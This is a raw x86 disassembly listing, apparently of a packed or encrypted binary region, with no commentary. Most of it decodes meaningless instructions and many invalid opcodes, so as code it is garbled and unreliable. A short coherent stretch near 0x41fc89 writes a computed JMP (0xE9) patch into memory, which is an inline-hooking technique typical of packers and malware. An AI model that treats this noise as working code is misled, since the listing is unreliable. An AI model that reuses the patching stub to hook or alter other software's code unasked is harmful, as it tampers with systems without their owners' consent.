  41f901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f902:	repnz xor eax,0xc3d6e3cf
  41f908:	ins    DWORD PTR es:[edi],dx
  41f909:	or     DWORD PTR [ebp-0x99379a8],edi
  41f90f:	out    0xf7,eax
  41f911:	sbb    al,0x8f
  41f913:	scas   al,BYTE PTR es:[edi]
  41f914:	pop    edx
  41f915:	jle    0x41f8ff
  41f917:	push   es
  41f918:	fcom   DWORD PTR [ecx-0x4810ee62]
  41f91e:	lock mov ?,edx
  41f921:	lea    esp,[ebp-0x5e]
  41f924:	dec    ecx
  41f925:	fnsave [ecx-0x8a00a09]
  41f92b:	dec    esi
  41f92c:	mov    bl,0x46
  41f92e:	and    eax,0x3e2e1689
  41f933:	pop    esi
  41f934:	neg    ebp
  41f936:	jo     0x41f8d5
  41f938:	bound  ebx,QWORD PTR [ebp+0x50]
  41f93b:	leave  
  41f93c:	out    0xad,eax
  41f93e:	push   cs
  41f93f:	cld    
  41f940:	in     al,dx
  41f941:	or     DWORD PTR [ebx+0x3a],esp
  41f944:	mov    BYTE PTR [ebx+0x7aa531b8],dl
  41f94a:	push   ecx
  41f94b:	cmp    al,0xc8
  41f94d:	xlat   BYTE PTR ds:[ebx]
  41f94e:	mov    al,ds:0x2ca43f94
  41f953:	mov    al,BYTE PTR [esi]
  41f955:	adc    BYTE PTR [ecx-0x13a546f7],dl
  41f95b:	adc    eax,0xc9a39465
  41f960:	fisttp QWORD PTR [ecx]
  41f962:	xchg   ebx,eax
  41f963:	or     bh,BYTE PTR [ecx]
  41f965:	mov    esi,0x69ebacd3
  41f96a:	mov    edi,0x73d3b4bf
  41f96f:	adc    eax,0xe44a2401
  41f974:	cdq    
  41f975:	pop    ds
  41f976:	sub    BYTE PTR [esi+0x383d88ca],ch
  41f97c:	pop    edi
  41f97d:	adc    al,BYTE PTR [ebx+0x4200e358]
  41f983:	ficom  WORD PTR [ebp+esi*4+0x5a684da8]
  41f98a:	pop    ecx
  41f98b:	sbb    al,0xd
  41f98d:	or     bh,BYTE PTR gs:[edi-0x40]
  41f991:	push   es
  41f992:	mov    bl,0xcf
  41f994:	xor    DWORD PTR [ecx],eax
  41f996:	xor    ah,BYTE PTR [esi-0x41]
  41f999:	bound  esi,QWORD PTR [esp+eax*2-0x62]
  41f99d:	rol    DWORD PTR [esi+0x5ce225c],0x11
  41f9a4:	test   ebx,ebp
  41f9a6:	or     ebp,ebx
  41f9a8:	add    DWORD PTR [edi],edx
  41f9aa:	popf   
  41f9ab:	jle    0x41f9c7
  41f9ad:	ss loope 0x41fa23
  41f9b0:	xchg   esi,eax
  41f9b1:	into   
  41f9b2:	call   0xdbfae0d2
  41f9b7:	fst    QWORD PTR [eax]
  41f9b9:	cld    
  41f9ba:	push   0x761cc22c
  41f9bf:	(bad)  
  41f9c0:	(bad)  
  41f9c1:	lods   al,BYTE PTR ds:[esi]
  41f9c2:	sti    
  41f9c3:	mov    esp,?
  41f9c5:	stos   DWORD PTR es:[edi],eax
  41f9c6:	in     eax,dx
  41f9c7:	jae    0x41f981
  41f9c9:	jb     0x41f962
  41f9cb:	rol    BYTE PTR fs:[esi+0x77ca730],cl
  41f9d2:	xchg   edx,eax
  41f9d3:	dec    ebp
  41f9d4:	scas   al,BYTE PTR es:[edi]
  41f9d5:	mov    ch,0x65
  41f9d7:	mov    dl,0x54
  41f9d9:	dec    esp
  41f9da:	call   0xae65:0x550bff94
  41f9e1:	fimul  WORD PTR [ebp+0x51]
  41f9e4:	jno    0x41f9d1
  41f9e6:	mov    ds:0x967cac6a,al
  41f9eb:	xor    bh,BYTE PTR [eax-0x6f]
  41f9ee:	cmp    eax,0x2de83506
  41f9f3:	fstp   QWORD PTR [esi]
  41f9f5:	pop    es
  41f9f6:	jbe    0x41f9a9
  41f9f8:	mov    ch,0xfa
  41f9fa:	(bad)  
  41f9fb:	jno    0x41fa2f
  41f9fd:	das    
  41f9fe:	cdq    
  41f9ff:	es jl  0x41fa1a
  41fa02:	mov    ebx,0xcf869b9
  41fa07:	repnz pop ds
  41fa09:	gs cwde 
  41fa0b:	je     0x41f9cd
  41fa0d:	ins    BYTE PTR es:[edi],dx
  41fa0e:	push   ebx
  41fa0f:	into   
  41fa10:	push   ss
  41fa11:	nop
  41fa12:	cmc    
  41fa13:	pop    edi
  41fa14:	push   ecx
  41fa15:	aas    
  41fa16:	sub    BYTE PTR [esi],al
  41fa18:	xor    DWORD PTR fs:[eax+0xbafa796],ebp
  41fa1f:	outs   dx,DWORD PTR ds:[esi]
  41fa20:	sti    
  41fa21:	dec    ebx
  41fa22:	jmp    0x3d3e:0xcf9ed000
  41fa29:	or     ecx,DWORD PTR ds:0x7ad7ff01
  41fa2f:	jnp    0x41fa80
  41fa31:	pushf  
  41fa32:	(bad)  [edi-0x27]
  41fa35:	into   
  41fa36:	or     BYTE PTR [ecx+ecx*8-0x52107811],cl
  41fa3d:	push   cs
  41fa3e:	mov    DWORD PTR [ebx+0x37],eax
  41fa41:	mov    cl,0x86
  41fa43:	pop    ds
  41fa44:	dec    esp
  41fa45:	out    dx,eax
  41fa46:	inc    esp
  41fa47:	mov    ecx,0x9b988270
  41fa4c:	pushf  
  41fa4d:	pop    eax
  41fa4e:	rol    ch,0xb0
  41fa51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa52:	call   0x9d39:0x3d2cab6c
  41fa59:	inc    eax
  41fa5a:	rcl    eax,1
  41fa5c:	mov    edi,0x125c2172
  41fa61:	sbb    BYTE PTR [ebp+0x21],bl
  41fa64:	ins    DWORD PTR es:[edi],dx
  41fa65:	dec    ebx
  41fa66:	lahf   
  41fa67:	mov    cl,0x78
  41fa69:	jge    0x41fa70
  41fa6b:	inc    ebx
  41fa6c:	mov    dl,0x7e
  41fa6e:	pop    ds
  41fa6f:	jmp    0x41f9fb
  41fa71:	dec    esi
  41fa72:	fdiv   QWORD PTR [esi+0xd0d3641]
  41fa78:	cmp    eax,0xdf1e4a4d
  41fa7d:	jecxz  0x41fa6a
  41fa7f:	jno    0x41fa44
  41fa81:	clc    
  41fa82:	(bad)  
  41fa83:	icebp  
  41fa84:	sahf   
  41fa85:	xchg   di,ax
  41fa87:	mov    ch,0x1b
  41fa89:	push   esi
  41fa8a:	(bad)  
  41fa8b:	aad    0xa4
  41fa8d:	addr16 mov edx,edi
  41fa90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa91:	in     al,dx
  41fa92:	jne    0x41fa37
  41fa94:	push   edi
  41fa95:	add    eax,0x8071c35d
  41fa9a:	in     al,dx
  41fa9b:	push   edi
  41fa9c:	jne    0x41fa28
  41fa9e:	pop    es
  41fa9f:	and    BYTE PTR [ebp-0x384631a6],ah
  41faa5:	cmp    al,0xac
  41faa7:	add    BYTE PTR [ecx+ecx*4-0x4d],bl
  41faab:	and    al,bh
  41faad:	fcom   st(5)
  41faaf:	int3   
  41fab0:	inc    esp
  41fab1:	xor    ch,BYTE PTR [edi]
  41fab3:	pushf  
  41fab4:	dec    eax
  41fab5:	xchg   ecx,eax
  41fab6:	jecxz  0x41fb19
  41fab8:	div    DWORD PTR [edi+0x73]
  41fabb:	(bad)  
  41fabc:	push   ds
  41fabd:	inc    edi
  41fabe:	cmp    edx,DWORD PTR [ecx+0x7376d62b]
  41fac4:	jo     0x41fb09
  41fac6:	lds    eax,FWORD PTR [edx-0x4031e7cc]
  41facc:	mov    ebp,0xd93527f7
  41fad1:	test   BYTE PTR [edi-0x76],ch
  41fad4:	call   0x72a6:0x46852dff
  41fadb:	(bad)  
  41fadc:	cld    
  41fadd:	jmp    0x41fb47
  41fadf:	retf   0x8590
  41fae2:	stos   DWORD PTR es:[edi],eax
  41fae3:	out    0x7,eax
  41fae5:	xchg   BYTE PTR [edx+0x2865e938],ah
  41faeb:	arpl   WORD PTR [ebx+ebx*8-0x3f28d4fc],ax
  41faf2:	sbb    dh,ch
  41faf4:	jle    0x41fb09
  41faf6:	push   edx
  41faf7:	push   ebx
  41faf8:	sbb    BYTE PTR [ebp-0x6479fe2d],ah
  41fafe:	fsubr  st,st(5)
  41fb00:	add    eax,0x50538db4
  41fb05:	adc    eax,DWORD PTR [ebx+0x2fe5a51e]
  41fb0b:	imul   BYTE PTR [edi-0x12]
  41fb0e:	std    
  41fb0f:	and    DWORD PTR [ebx+eax*4],0xa92a8c2
  41fb16:	ja     0x41faf6
  41fb18:	jnp    0x41fb84
  41fb1a:	call   0xeee1f43a
  41fb1f:	pop    edi
  41fb20:	pop    ss
  41fb21:	cli    
  41fb22:	push   ss
  41fb23:	out    0x77,eax
  41fb25:	call   edx
  41fb27:	or     dl,BYTE PTR [esi+0x43481e0e]
  41fb2d:	adc    al,BYTE PTR [esi-0x21]
  41fb30:	sbb    BYTE PTR [edx+edx*4+0x68],al
  41fb34:	or     ch,BYTE PTR [edx]
  41fb36:	test   DWORD PTR [ebx+0x1e],0xfe169a41
  41fb3d:	loop   0x41fb91
  41fb3f:	in     eax,0xa2
  41fb41:	adc    BYTE PTR [esi-0x5d],cl
  41fb44:	pop    ebx
  41fb45:	div    ch
  41fb47:	enter  0xebf8,0xf1
  41fb4b:	inc    esp
  41fb4c:	imul   edx,DWORD PTR [eax-0x452e80ee],0x2973248d
  41fb56:	jmp    0x769b234c
  41fb5b:	popa   
  41fb5c:	div    BYTE PTR [ebx+0x53a0ba89]
  41fb62:	enter  0x2a99,0x5b
  41fb66:	and    edx,eax
  41fb68:	bound  ebp,QWORD PTR [edx]
  41fb6a:	mov    eax,ds:0x8a5c1462
  41fb6f:	xchg   edi,eax
  41fb70:	dec    ebp
  41fb71:	xchg   esp,eax
  41fb72:	sbb    edi,DWORD PTR [ebp+0x357a8877]
  41fb78:	std    
  41fb79:	pop    ebx
  41fb7a:	fcomi  st,st(7)
  41fb7c:	sbb    BYTE PTR [esi],bl
  41fb7e:	mov    BYTE PTR [ebx+0x4671d98c],ah
  41fb84:	test   dh,0x6d
  41fb87:	aas    
  41fb88:	jae    0x41fbe2
  41fb8a:	xchg   DWORD PTR [edx+0x75],ecx
  41fb8d:	pop    ecx
  41fb8e:	jns    0x41fb4b
  41fb90:	pop    ds
  41fb91:	cmc    
  41fb92:	add    dh,BYTE PTR [esi]
  41fb94:	(bad)  
  41fb95:	test   eax,0x2fce2c0d
  41fb9a:	dec    ebx
  41fb9b:	xlat   BYTE PTR ds:[ebx]
  41fb9c:	in     al,0x1a
  41fb9e:	pushf  
  41fb9f:	push   0x47
  41fba1:	and    al,0xbb
  41fba3:	add    al,0xc6
  41fba5:	sbb    al,0x52
  41fba7:	lahf   
  41fba8:	xor    al,bh
  41fbaa:	cld    
  41fbab:	es jne 0x41fb87
  41fbae:	pop    ds
  41fbaf:	icebp  
  41fbb0:	jmp    0x73498351
  41fbb5:	inc    edi
  41fbb6:	outs   dx,BYTE PTR ds:[esi]
  41fbb7:	imul   esi,ecx,0xffffffe6
  41fbba:	cld    
  41fbbb:	mov    esp,DWORD PTR [esi+esi*1-0x1a]
  41fbbf:	and    ebp,ecx
  41fbc1:	(bad)  
  41fbc2:	aad    0xc0
  41fbc4:	(bad)  
  41fbc6:	mov    bl,0xd1
  41fbc8:	xchg   esi,eax
  41fbc9:	dec    ecx
  41fbca:	sub    al,0xe1
  41fbcc:	push   ecx
  41fbcd:	ret    0x86f5
  41fbd0:	(bad)  
  41fbd1:	mov    edx,DWORD PTR [ebx-0x2b1239ef]
  41fbd7:	imul   esp,DWORD PTR [ebx+0x50d4fe8e],0xf45d92a
  41fbe1:	pop    ds
  41fbe2:	push   ebx
  41fbe3:	push   ss
  41fbe4:	in     eax,0x4a
  41fbe6:	imul   ecx,DWORD PTR [eax-0x66a77d5b],0x73
  41fbed:	jge    0x41fc68
  41fbef:	es cmp al,0x52
  41fbf2:	ficomp WORD PTR [esi+eax*4+0x2b9125da]
  41fbf9:	gs jl  0x41fc30
  41fbfc:	icebp  
  41fbfd:	push   ebp
  41fbfe:	loop   0x41fc6d
  41fc00:	js     0x41fb8a
  41fc02:	adc    ch,BYTE PTR [edx+0x46f90cc3]
  41fc08:	sub    esi,esp
  41fc0a:	cmp    eax,0x3c41d330
  41fc0f:	sbb    al,0xde
  41fc11:	dec    edi
  41fc12:	jns    0x41fc40
  41fc14:	pop    edi
  41fc15:	pop    ebx
  41fc16:	scas   al,BYTE PTR es:[edi]
  41fc17:	ficom  DWORD PTR [edx+0xc9d7e4e]
  41fc1d:	mov    ebp,0xf2c927b3
  41fc22:	mov    dx,0xc763
  41fc26:	int3   
  41fc27:	fimul  WORD PTR [ebp-0x14]
  41fc2a:	cwde   
  41fc2b:	cmp    eax,0xe9c560fe
  41fc30:	mov    al,ds:0xd33353f0
  41fc35:	push   ds
  41fc36:	enter  0x4659,0xd8
  41fc3a:	push   es
  41fc3b:	dec    ecx
  41fc3c:	xchg   ecx,eax
  41fc3d:	frstor [ecx]
  41fc3f:	pop    ebp
  41fc40:	lock ret 
  41fc42:	sti    
  41fc43:	or     esp,ebx
  41fc45:	adc    eax,0x56f5b57
  41fc4a:	sahf   
  41fc4b:	not    BYTE PTR [ebx-0x6def5376]
  41fc51:	(bad)  
  41fc52:	mov    ebx,0x3bfa4450
  41fc57:	loop   0x41fc8a
  41fc59:	pop    ecx
  41fc5a:	stos   BYTE PTR es:[edi],al
  41fc5b:	inc    esi
  41fc5c:	sbb    DWORD PTR [eax-0x1d95d3a],ebx
  41fc62:	sar    ch,0x2b
  41fc65:	mov    bh,BYTE PTR [ebp+eiz*2+0x52]
  41fc69:	test   DWORD PTR [ebx],ecx
  41fc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc6c:	fmul   QWORD PTR [edi-0xb]
  41fc6f:	sbb    ebp,edx
  41fc71:	pop    ecx
  41fc72:	in     al,dx
  41fc73:	shl    ch,0x7c
  41fc76:	or     ebp,ebx
  41fc78:	dec    esi
  41fc79:	rcl    BYTE PTR [edx],1
  41fc7b:	push   esi
  41fc7c:	inc    esi
  41fc7d:	fld    DWORD PTR [eax+0x2]
  41fc80:	adc    bl,BYTE PTR [ecx-0x39cc98e9]
  41fc86:	add    eax,edi
  41fc88:	push   eax
  41fc89:	mov    eax,DWORD PTR [ebp-0x24]
  41fc8c:	add    eax,0xaa
  41fc91:	push   eax
  41fc92:	mov    eax,DWORD PTR [ebp-0x24]
  41fc95:	mov    eax,DWORD PTR [eax+0x198]
  41fc9b:	push   DWORD PTR [eax]
  41fc9d:	call   0x423658
  41fca2:	mov    DWORD PTR [ebp-0x14],eax
  41fca5:	lea    eax,[ebp+0x4]
  41fca8:	mov    DWORD PTR [ebp-0x30],eax
  41fcab:	mov    eax,DWORD PTR [ebp-0x14]
  41fcae:	test   eax,eax
  41fcb0:	je     0x422078
  41fcb6:	lea    eax,[ebp-0x8]
  41fcb9:	mov    DWORD PTR [ebp-0x38],eax
  41fcbc:	mov    eax,DWORD PTR [ebp-0x34]
  41fcbf:	mov    DWORD PTR [ebp-0x8],eax
  41fcc2:	mov    eax,DWORD PTR [ebp-0x8]
  41fcc5:	mov    ecx,DWORD PTR [ebp-0x14]
  41fcc8:	sub    eax,ecx
  41fcca:	mov    DWORD PTR [ebp-0x8],eax
  41fccd:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd0:	xor    ecx,esi
  41fcd2:	mov    eax,0xffcd8d14
  41fcd7:	sub    eax,ecx
  41fcd9:	add    DWORD PTR [ebp-0x8],eax
  41fcdc:	mov    eax,DWORD PTR [ebp-0x8]
  41fcdf:	mov    ecx,DWORD PTR [ebp-0x14]
  41fce2:	mov    DWORD PTR [ecx+0x1],eax
  41fce5:	mov    eax,DWORD PTR [ebp-0x14]
  41fce8:	push   DWORD PTR [ebp-0x24]
  41fceb:	mov    BYTE PTR [eax],0xe9
  41fcee:	mov    eax,ds:0x42816b
  41fcf3:	push   DWORD PTR [eax]
  41fcf5:	push   DWORD PTR ds:0x4283c7
  41fcfb:	push   DWORD PTR ds:0x428173
  41fd01:	jmp    0x422061
  41fd06:	inc    edi
  41fd07:	cmp    esi,0x5e
  41fd0a:	mov    dh,0x3
  41fd0c:	(bad)  
  41fd0d:	jnp    0x41fce7
  41fd0f:	sub    DWORD PTR [esi],ebx
  41fd11:	jmp    0x41fd77
  41fd13:	arpl   di,cx
  41fd15:	outs   dx,DWORD PTR ds:[esi]
  41fd16:	out    dx,eax
  41fd17:	test   eax,0x5f3f7a7d
  41fd1c:	jp     0x41fd98
  41fd1e:	(bad)  
  41fd1f:	dec    edi
  41fd20:	fwait
  41fd21:	stos   BYTE PTR es:[edi],al
  41fd22:	sbb    eax,0xa09c10d
  41fd27:	cmc    
  41fd28:	data16 fisttp QWORD PTR [esi]
  41fd2b:	std    
  41fd2c:	rcr    DWORD PTR [edi-0x6f4daec8],cl
  41fd32:	js     0x41fd2b
  41fd34:	xchg   DWORD PTR [edx],ebp
  41fd36:	out    dx,eax
  41fd37:	icebp  
  41fd38:	in     al,0x2f
  41fd3a:	jbe    0x41fd86
  41fd3c:	cwde   
  41fd3d:	lds    ecx,FWORD PTR [esi-0x5c36bd18]
  41fd43:	arpl   ax,sp
  41fd45:	or     BYTE PTR [edx-0x5d2aa796],dl
  41fd4b:	aam    0x3f
  41fd4d:	fdivr  DWORD PTR [esi-0x6372223b]
  41fd53:	mov    ch,0x2
  41fd55:	mov    ss,WORD PTR [edi+0x1e]
  41fd58:	loop   0x41fd55
  41fd5a:	mov    ah,0x8f
  41fd5c:	adc    al,0x81
  41fd5e:	fistp  QWORD PTR [eax+0x78]
  41fd61:	data16 sbb dl,BYTE PTR [ebp-0x7b]
  41fd65:	scas   al,BYTE PTR es:[edi]
  41fd66:	out    dx,al
  41fd67:	push   cs
  41fd68:	leave  
  41fd69:	sub    bl,cl
  41fd6b:	pop    ss
  41fd6c:	fs pop es
  41fd6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd6f:	xchg   ebx,eax
  41fd70:	data16 and al,0x4b
  41fd73:	hlt    
  41fd74:	mov    ds:0xf9d6203f,al
  41fd79:	push   eax
  41fd7a:	xchg   edi,eax
  41fd7b:	and    al,0x23
  41fd7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd7e:	aam    0x52
  41fd80:	inc    esi
  41fd81:	sbb    BYTE PTR [ecx+0x2f671c90],ah
  41fd87:	test   eax,0x7e5fd552
  41fd8c:	sub    al,0x82
  41fd8e:	mov    WORD PTR [esi+0x69],?
  41fd91:	int3   
  41fd92:	les    ebx,FWORD PTR [esi+0x3f]
  41fd95:	xor    al,0xc7
  41fd97:	cs mov ah,0x4e
  41fd9a:	je     0x41fd73
  41fd9c:	jns    0x41fd83
  41fd9e:	shr    BYTE PTR [esi],0xfe
  41fda1:	jnp    0x41fe07
  41fda3:	(bad)  
  41fda4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fda5:	fisubr DWORD PTR [ecx+0x1ef5af8f]
  41fdab:	xor    BYTE PTR [esp+eiz*2+0x45474bd8],bh
  41fdb2:	lods   al,BYTE PTR ds:[esi]
  41fdb3:	pushf  
  41fdb4:	mov    dl,0xd3
  41fdb6:	mov    bl,0xb3
  41fdb8:	out    0x59,eax
  41fdba:	jg     0x41fe0c
  41fdbc:	xor    eax,0xad0412d6
  41fdc1:	jo     0x41fd59
  41fdc3:	jb     0x41fde1
  41fdc5:	push   ss
  41fdc6:	jne    0x41fdf6
  41fdc8:	sub    ecx,DWORD PTR [edx+0x2b]
  41fdcb:	mov    eax,ds:0x66413020
  41fdd0:	push   ds
  41fdd1:	inc    esi
  41fdd2:	cld    
  41fdd3:	fild   WORD PTR ds:0x430d4f11
  41fdd9:	or     bh,BYTE PTR [edx+esi*4]
  41fddc:	ins    DWORD PTR es:[edi],dx
  41fddd:	mov    ebp,0xb6b6ed95
  41fde2:	xor    bl,BYTE PTR [ebx-0x63b88604]
  41fde8:	push   cs
  41fde9:	inc    edx
  41fdea:	leave  
  41fdeb:	fisub  DWORD PTR [eax+0x36c5c5eb]
  41fdf1:	ins    DWORD PTR es:[edi],dx
  41fdf2:	outs   dx,BYTE PTR ds:[esi]
  41fdf3:	js     0x41fdca
  41fdf5:	jns    0x41fe24
  41fdf7:	mov    WORD PTR [edx],?
  41fdf9:	inc    eax
  41fdfa:	cli    
  41fdfb:	inc    ebx
  41fdfc:	jmp    FWORD PTR [edi+0x57]
  41fdff:	sub    BYTE PTR [esi],al
  41fe01:	lahf   
  41fe02:	rol    BYTE PTR [edi+0x79a8e764],0xf5
  41fe09:	daa    
  41fe0a:	adc    al,0x3c
  41fe0c:	cli    
  41fe0d:	adc    edi,DWORD PTR [esi+0x5099082f]
  41fe13:	retf   
  41fe14:	cmp    eax,0xf142286d
  41fe19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe1a:	test   edx,edi
  41fe1c:	jg     0x41fe11
  41fe1e:	out    dx,al
  41fe1f:	enter  0x950b,0x51
  41fe23:	adc    DWORD PTR cs:[ebx+0x385c717b],0xffffff9e
  41fe2b:	out    dx,eax
  41fe2c:	test   eax,0xad01f388
  41fe31:	sbb    bl,BYTE PTR [ebx-0x2a]
  41fe34:	pop    ebp
  41fe35:	loope  0x41fe5f
  41fe37:	adc    eax,0x983f4a9d
  41fe3c:	sbb    al,0xf4
  41fe3e:	sbb    bh,cl
  41fe40:	fnstsw WORD PTR [ebx+0x7c47d022]
  41fe46:	push   eax
  41fe47:	sub    DWORD PTR [esi],ebp
  41fe49:	xor    al,0x7e
  41fe4b:	xor    ebp,DWORD PTR [edx+0x191c21cb]
  41fe51:	imul   ebp,DWORD PTR [ebp-0x2f2e7c95],0x3d35a4b1
  41fe5b:	xor    eax,DWORD PTR [esi-0xa]
  41fe5e:	mov    ebp,0x2b477062
  41fe63:	out    0xbb,eax
  41fe65:	xor    BYTE PTR [ecx-0x37aea354],al
  41fe6b:	xlat   BYTE PTR ds:[ebx]
  41fe6c:	fmul   QWORD PTR [ebp-0x7]
  41fe6f:	add    DWORD PTR [eax],ebp
  41fe71:	xor    eax,0xba52a73a
  41fe76:	ja     0x41fe86
  41fe78:	aad    0xb5
  41fe7a:	push   edi
  41fe7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe7c:	mov    bl,0xf
  41fe7e:	call   FWORD PTR [ecx+edx*1-0x15c8cb6b]
  41fe85:	int3   
  41fe86:	mov    esp,eax
  41fe88:	xchg   edi,eax
  41fe89:	nop
  41fe8a:	lahf   
  41fe8b:	loop   0x41fe3d
  41fe8d:	push   ds
  41fe8e:	jl     0x41fe6b
  41fe90:	rcl    BYTE PTR [eax+esi*4-0x36],cl
  41fe94:	mov    BYTE PTR [esi],0xc5
  41fe97:	repz cmp dh,0x52
  41fe9b:	dec    eax
  41fe9c:	dec    esp
  41fe9d:	mov    al,ds:0x954c8e28
  41fea2:	mov    ebp,fs
  41fea4:	imul   edi,DWORD PTR [ebx+0x2a],0xd675c2fa
  41feab:	idiv   BYTE PTR [ebx+0x5c6615c8]
  41feb1:	xchg   BYTE PTR [edi],dl
  41feb3:	inc    esp
  41feb4:	lods   eax,DWORD PTR ds:[esi]
  41feb5:	adc    dh,bl
  41feb7:	xchg   ebp,eax
  41feb8:	dec    edi
  41feb9:	mov    esp,edi
  41febb:	out    0xe5,eax
  41febd:	sbb    dl,cl
  41febf:	push   0xf6b3b5c6
  41fec4:	lods   eax,DWORD PTR ds:[esi]
  41fec5:	xchg   ebp,eax
  41fec6:	and    cl,bl
  41fec8:	xor    DWORD PTR [esp+eax*1],edx
  41fecb:	cld    
  41fecc:	inc    ebp
  41fecd:	adc    dl,bl
  41fecf:	xchg   esi,eax
  41fed0:	js     0x41ff0f
  41fed2:	jmp    0x89f2964
  41fed7:	pushf  
  41fed8:	adc    edx,esi
  41feda:	xor    al,0x3
  41fedc:	mov    ebx,0xa1aa4b0a
  41fee1:	jns    0x41fe93
  41fee3:	xchg   edi,eax
  41fee4:	in     al,dx
  41fee5:	xchg   edi,eax
  41fee6:	mov    dh,BYTE PTR [ebx+0x5]
  41fee9:	iret   
  41feea:	inc    eax
  41feeb:	and    bh,ah
  41feed:	dec    ebx
  41feee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41feef:	clc    
  41fef0:	pop    edx
  41fef1:	jle    0x41fe92
  41fef3:	add    bl,dl
  41fef5:	repz sar BYTE PTR fs:[edi+0x6aa4094b],0x34
  41fefe:	and    ah,BYTE PTR [ebx-0x2b]
  41ff01:	(bad)  
  41ff02:	je     0x41fed3
  41ff04:	mov    ds:0xfd635dc5,al
  41ff09:	push   ecx
  41ff0a:	add    BYTE PTR ds:[edx+0x56],0x56
  41ff0f:	push   0x125399d
  41ff14:	xchg   esi,eax
  41ff15:	loopne 0x41ff8e
  41ff17:	into   
  41ff18:	sub    DWORD PTR [edx+0x2d],ecx
  41ff1b:	jb     0x41ff47
  41ff1d:	or     DWORD PTR [eax-0x41deaefb],0xb6b92e25
  41ff27:	callw  0x605b
  41ff2b:	scas   al,BYTE PTR es:[edi]
  41ff2c:	sub    esi,0x7f
  41ff2f:	xchg   esp,eax
  41ff30:	pop    ss
  41ff31:	jmp    0x41ff21
  41ff33:	(bad)  
  41ff34:	dec    ebx
  41ff35:	test   edx,0x580cb79d
  41ff3b:	je     0x41ff8d
  41ff3d:	lods   al,BYTE PTR ds:[esi]
  41ff3e:	test   al,0x1
  41ff40:	and    eax,0xe6d458cc
  41ff45:	sbb    bl,BYTE PTR [eax+0x7a]
  41ff48:	and    al,0xa0
  41ff4a:	ss test bh,bh
  41ff4d:	dec    eax
  41ff4e:	bound  esp,QWORD PTR [eax+esi*4-0x1ee73769]
  41ff55:	mov    edx,0x6e586cae
  41ff5a:	in     eax,0xca
  41ff5c:	or     BYTE PTR [ecx+ebp*2+0x18a9ba58],bh
  41ff63:	test   ebp,ecx
  41ff65:	and    al,0xbd
  41ff67:	in     eax,0x1d
  41ff69:	test   al,0x71
  41ff6b:	icebp  
  41ff6c:	shl    ch,cl
  41ff6e:	add    DWORD PTR [esi],ebp
  41ff70:	fistp  DWORD PTR [eax-0x66]
  41ff73:	sahf   
  41ff74:	mov    eax,ds:0x31aa28d8
  41ff79:	dec    ebx
  41ff7a:	jno    0x41ff24
  41ff7c:	ds in  al,0x6
  41ff7f:	cs cdq 
  41ff81:	and    ecx,DWORD PTR [esi+0x6430b42d]
  41ff87:	jmp    0x125c4e74
  41ff8c:	push   edx
  41ff8d:	jecxz  0x41ff8d
  41ff8f:	popa   
  41ff90:	mov    ecx,0x9735c266
  41ff95:	pop    esp
  41ff96:	jg     0x41ff50
  41ff98:	xor    ah,BYTE PTR [esi]
  41ff9a:	mov    cl,0x9a
  41ff9c:	or     al,0x1f
  41ff9e:	or     eax,0xcb858099
  41ffa3:	push   esp
  41ffa4:	jmp    0xeedd7125
  41ffa9:	and    ah,cl
  41ffab:	loop   0x42001b
  41ffad:	std    
  41ffae:	out    0xbf,eax
  41ffb0:	sbb    eax,0xfa7ed54a
  41ffb5:	adc    BYTE PTR [esi-0x1d],0x0
  41ffb9:	xchg   edx,eax
  41ffba:	xchg   ecx,eax
  41ffbb:	mov    dh,0xd1
  41ffbd:	(bad)  
  41ffbf:	and    dl,BYTE PTR [esi-0x34]
  41ffc2:	and    BYTE PTR [ecx-0x8],al
  41ffc5:	call   0x87b1:0x8ec24d21
  41ffcc:	lahf   
  41ffcd:	mov    al,ds:0x546397a4
  41ffd2:	xor    BYTE PTR [ebp-0x39367919],al
  41ffd8:	push   eax
  41ffd9:	outs   dx,DWORD PTR ds:[esi]
  41ffda:	loope  0x420039
  41ffdc:	or     DWORD PTR [edi],eax
  41ffde:	push   edi
  41ffdf:	cld    
  41ffe0:	mov    WORD PTR [eax],gs
  41ffe2:	xchg   ebx,eax
  41ffe3:	lods   eax,DWORD PTR ds:[esi]
  41ffe4:	inc    esi
  41ffe5:	xchg   ah,dh
  41ffe7:	jnp    0x41ffd6
  41ffe9:	(bad)  
  41ffea:	push   cs
  41ffeb:	loopne 0x41ffe2
  41ffed:	cmp    BYTE PTR [eax-0x3b],dh
  41fff0:	je     0x420055
  41fff2:	nop
  41fff3:	adc    al,BYTE PTR [esi-0x6565de39]
  41fff9:	push   es
  41fffa:	adc    BYTE PTR [edx+0x1294901a],0xc0
  420001:	pop    ss
  420002:	rol    esp,1
  420004:	add    eax,0xba76cff2
  420009:	cmp    BYTE PTR [eax],0x2f
  42000c:	loop   0x42003b
  42000e:	or     DWORD PTR [edi-0x4],ecx
  420011:	retf   
  420012:	xchg   esp,eax
  420013:	in     al,dx
  420014:	push   ebp
  420015:	push   esi
  420016:	cmp    bh,BYTE PTR [edx+0x137047a9]
  42001c:	xchg   edx,eax
  42001d:	nop
  42001e:	dec    esi
  42001f:	popf   
  420020:	or     DWORD PTR [ecx+edi*2],esp
  420023:	jl     0x41fff1
  420025:	cmp    bl,BYTE PTR [ecx-0x2]
  420028:	or     BYTE PTR [edi-0x3d],bh
  42002b:	(bad)  
  42002d:	sub    DWORD PTR [edi],eax
  42002f:	lock inc ebx
  420031:	adc    ah,BYTE PTR [esp+eax*4]
  420034:	or     al,ah
  420036:	out    dx,eax
  420037:	jle    0x420096
  420039:	lods   eax,DWORD PTR ds:[esi]
  42003a:	inc    ecx
  42003b:	out    dx,al
  42003c:	mov    ds:0x8e9c26e9,al
  420041:	div    DWORD PTR [ecx]
  420043:	xchg   esi,eax
  420044:	fnstsw WORD PTR [ecx]
  420046:	add    al,0x65
  420048:	xchg   edx,edi
  42004a:	repz rcr BYTE PTR ss:[edi-0x6b3a901a],cl
  420052:	(bad)  
  420053:	push   edi
